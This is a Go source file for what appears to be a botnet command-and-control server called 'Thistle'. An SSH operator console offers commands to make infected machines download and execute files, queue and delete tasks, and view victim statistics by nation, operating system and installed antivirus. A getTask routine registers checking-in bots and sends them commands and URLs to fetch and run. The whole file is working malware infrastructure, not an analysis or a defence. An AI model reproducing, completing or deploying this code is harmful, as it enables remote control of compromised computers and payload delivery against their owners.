package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/bcrypt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/exp/rand"
)

var quotes = [7]string{
	"Totally tubular dude!", "Just leave me alone, I know what to do", "Do not operate under the influence of alcohol",
	"Best or the rest", "OPA!!", "Don't use when wet", ";)",
}

func printLogo(channel ssh.Channel) {
	logo := `
	Made by Incog
 _____ _     _     _   _      
/__   \ |__ (_)___| |_| | ___ 
  / /\/ '_ \| / __| __| |/ _ \
 / /  | | | | \__ \ |_| |  __/
 \/   |_| |_|_|___/\__|_|\___|						   
`
	coloredMessage := color.New(color.FgHiRed).Sprint(logo)
	fmt.Fprintln(channel, coloredMessage)
}

func displayPrompt(channel ssh.Channel, username string) {
	coloredMessage := color.New(color.FgHiRed).Sprintf("thistle")
	prompt := fmt.Sprintf("%s@%s:~$ ", username, coloredMessage)
	fmt.Fprint(channel, prompt)
}

func getRandomQuote() string {
	return quotes[rand.Intn(len(quotes))]
}

func startLoadingAnimation(channel ssh.Channel) {
	animation := []string{"|", "/", "-", "\\"}
	startTime := time.Now()
	duration := 3 * time.Second

	for time.Since(startTime) < duration {
		for _, frame := range animation {
			if time.Since(startTime) >= duration {
				return
			}
			fmt.Fprintf(channel, "\r%s Loading...", frame)
			time.Sleep(200 * time.Millisecond)
			fmt.Fprintf(channel, "\r\033[K") // Clear line
		}
	}
	fmt.Fprintf(channel, "\r\033[K") // Clear line
}

func clearTerminal(channel ssh.Channel) {
	fmt.Fprintf(channel, "\033[2J\033[H")
}

func displayMenu(channel ssh.Channel) {
	printLogo(channel)
	menu := `
Commands:
.download - downloads and executes from arguments
.update - updates the client given arguments
.viewtasks - view all tasks
.deletetask - delete a task
.viewstats - view device stats
`
	fmt.Fprint(channel, menu)
}

func getUserInput(channel ssh.Channel) (string, error) {
	buf := make([]byte, 1024)
	n, err := channel.Read(buf)
	if err != nil {
		return "", err
	}
	input := string(buf[:n])
	return input[:len(input)-1], nil
}

// Load private key from file
func loadPrivateKey(filename string) (ssh.Signer, error) {
	keyBytes, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to read key file: %v", err)
	}
	signer, err := ssh.ParsePrivateKey(keyBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse private key: %v", err)
	}
	return signer, nil
}

// Load users from JSON file
func loadUsers(filename string) error {
	file, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read user file: %v", err)
	}

	var users []User
	if err := json.Unmarshal(file, &users); err != nil {
		return fmt.Errorf("failed to parse user file: %v", err)
	}

	for _, user := range users {
		authorizedPasswords[user.Username] = user.Password
	}

	return nil
}

// Check password authentication
func checkPassword(username, password string) bool {
	hashedPassword, exists := authorizedPasswords[username]
	if !exists {
		return false
	}
	err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password))
	return err == nil
}

// Create database
func createDatabase(dbFileName string) {
	db, err := sql.Open("sqlite3", dbFileName)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Define your schema
	completed_tasks_schema := `
    CREATE TABLE "completed_tasks" (
	"taskid"	TEXT NOT NULL,
	"hwid"	TEXT NOT NULL,
	PRIMARY KEY("taskid")
	)
    `

	tasks_schema := `
    CREATE TABLE "tasks" (
	"taskid"	TEXT NOT NULL UNIQUE,
	"command"	TEXT NOT NULL,
	"url"	TEXT NOT NULL,
	"executions_h"	INTEGER NOT NULL,
	"executions_n"	INTEGER NOT NULL,
	"filters"	TEXT NOT NULL,
	"created"	INTEGER NOT NULL,
	PRIMARY KEY("taskid")
	)
    `

	devices_schema := `
	CREATE TABLE "devices" (
	"hwid"	TEXT NOT NULL UNIQUE,
	"nation"	TEXT NOT NULL,
	"ip"	TEXT NOT NULL,
	"av"	TEXT NOT NULL,
	"os"	TEXT NOT NULL,
	"status"	TEXT NOT NULL,
	"lastping"	INTEGER NOT NULL,
	"type"	TEXT NOT NULL,
	PRIMARY KEY("hwid")
)`

	// Execute the schema
	_, err = db.Exec(completed_tasks_schema)
	if err != nil {
		log.Fatal(err)
	}
	_, err = db.Exec(tasks_schema)
	if err != nil {
		log.Fatal(err)
	}
	_, err = db.Exec(devices_schema)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Database and schema created successfully.")
}

// Prints top nations
func printTopNations(channel ssh.Channel) {
	query := `
        SELECT nation, COUNT(*) as count
        FROM devices
        GROUP BY nation
        ORDER BY count DESC
        LIMIT 5;
    `
	rows, err := db.Query(query)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	fmt.Fprintln(channel, "Top 5 nations by device count:")
	for rows.Next() {
		var nation string
		var count int
		err = rows.Scan(&nation, &count)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(channel, "Nation: %s, Count: %d\n", nation, count)
	}

	// Check for errors from iterating over rows.
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintf(channel, "\n")

}

// IDK why I comment the function explains itself like tf
func printTopOperatingSystem(channel ssh.Channel) {
	query := `
        SELECT os, COUNT(*) as count
        FROM devices
        GROUP BY os
        ORDER BY count DESC
        LIMIT 3;
    `
	rows, err := db.Query(query)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	fmt.Fprintln(channel, "Top 3 Operating Systems:")
	for rows.Next() {
		var nation string
		var count int
		err = rows.Scan(&nation, &count)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(channel, "OS: %s, Count: %d\n", nation, count)
	}

	// Check for errors from iterating over rows.
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintf(channel, "\n")
}

// guess
func printTopAntivirus(channel ssh.Channel) {
	query := `
        SELECT av, COUNT(*) as count
        FROM devices
        GROUP BY av
        ORDER BY count DESC
        LIMIT 3;
    `
	rows, err := db.Query(query)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	fmt.Fprintln(channel, "Top 3 Antivirus Installed:")
	for rows.Next() {
		var nation string
		var count int
		err = rows.Scan(&nation, &count)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(channel, "Antivirus: %s, Count: %d\n", nation, count)
	}

	// Check for errors from iterating over rows.
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintf(channel, "\n")

}

// super mysterious task
func getTask(data string) []byte {
	db.Exec(`UPDATE tasks SET status = "complete" WHERE executions_h = executions_n`)
	formatted_data := strings.Split(data, "|")
	var exists bool
	checkquery := `SELECT EXISTS(SELECT 1 FROM devices WHERE hwid = ? LIMIT 1)`
	err := db.QueryRow(checkquery, formatted_data[1]).Scan(&exists)
	if err != nil {
		return nil
	}
	if !exists {
		db.Exec("INSERT INTO devices(hwid,ip,nation,os,av,type,lastping,status) VALUES(?,?,?,?,?,?,?,?)", formatted_data[1], formatted_data[2], formatted_data[3], formatted_data[4], formatted_data[5], formatted_data[6], time.Now().Unix(), "online")
		return []byte("THISTLE|EMPTY")
	}
	fmt.Println("Device exists")
	db.Exec("UPDATE devices SET status= 'online', lastping = ? WHERE hwid = ?", time.Now().Unix(), formatted_data[1])
	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")

	// Find the newest task
	var task Task
	fmt.Println("Task filter is: ", formatted_data[6])
	query := `SELECT taskid, command, url, executions_h, executions_n, filters, created 
              FROM tasks 
			  WHERE filters = ? AND status="active"
              ORDER BY created ASC 
              LIMIT 1`
	err = db.QueryRow(query, formatted_data[6]).Scan(&task.TaskID, &task.Command, &task.URL, &task.ExecutionsH, &task.ExecutionsN, &task.Filters, &task.Created)
	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("Nothing returned")
			return []byte("THISTLE|EMPTY")
		}
		fmt.Println(err)
		return []byte("THISTLE|EMPTY")
	}

	// Check if the user's HWID is in the completed_tasks table for the task
	var count int
	query = `SELECT COUNT(*) FROM completed_tasks WHERE taskid = ? AND hwid = ?`
	err = db.QueryRow(query, task.TaskID, formatted_data[1]).Scan(&count)
	if err != nil {
		fmt.Println(err)
		return []byte("THISTLE|EMPTY")
	}

	// If the user's HWID is not found, return the task
	if count == 0 {
		db.Exec("UPDATE tasks SET executions_h = executions_h +1 WHERE taskid = ?", task.TaskID)
		db.Exec(`UPDATE tasks SET status = "complete" WHERE executions_h = executions_n`)
		db.Exec("INSERT INTO completed_tasks(taskid,hwid) VALUES(?,?)", task.TaskID, formatted_data[1])
		return []byte("THISTLE" + "|" + task.Command + "|" + task.URL)
	}

	return []byte("THISTLE | EMPTY")

}

type Task struct {
	TaskID      string
	Command     string
	URL         string
	ExecutionsH int
	ExecutionsN int
	Filters     string
	Created     int64
}

func GetCounts() (string, string, string) {
	var onlineCount int
	var offlineCount int

	queryOnline := `SELECT COUNT(*) FROM devices WHERE status = 'online'`
	err := db.QueryRow(queryOnline).Scan(&onlineCount)
	if err != nil {
		return "0", "0", "0"
	}

	queryOffline := `SELECT COUNT(*) FROM devices WHERE status = 'offline'`
	err = db.QueryRow(queryOffline).Scan(&offlineCount)
	if err != nil {
		return "0", "0", "0"
	}

	total := onlineCount + offlineCount

	return fmt.Sprintf("%d", onlineCount), fmt.Sprintf("%d", offlineCount), fmt.Sprintf("%d", total)
}

func GetDeviceCounts(db *sql.DB) (string, string, string, error) {
	query := `
		SELECT 
			type,
			COUNT(*) as count
		FROM 
			devices
		GROUP BY 
			type
		HAVING 
			type IN ('win', 'linux', 'other')
	`

	// Execute the query
	rows, err := db.Query(query)
	if err != nil {
		return "", "", "", err
	}
	defer rows.Close()

	// Initialize counters
	countWin := 0
	countLinux := 0
	countOther := 0

	// Process the results
	for rows.Next() {
		var typ string
		var count int
		err := rows.Scan(&typ, &count)
		if err != nil {
			return "", "", "", err
		}

		switch typ {
		case "win":
			countWin = count
		case "linux":
			countLinux = count
		case "other":
			countOther = count
		}
	}

	// Check for errors from iterating over rows
	if err := rows.Err(); err != nil {
		return "", "", "", err
	}

	// Convert counts to strings
	return fmt.Sprintf("%d", countWin), fmt.Sprintf("%d", countLinux), fmt.Sprintf("%d", countOther), nil
}
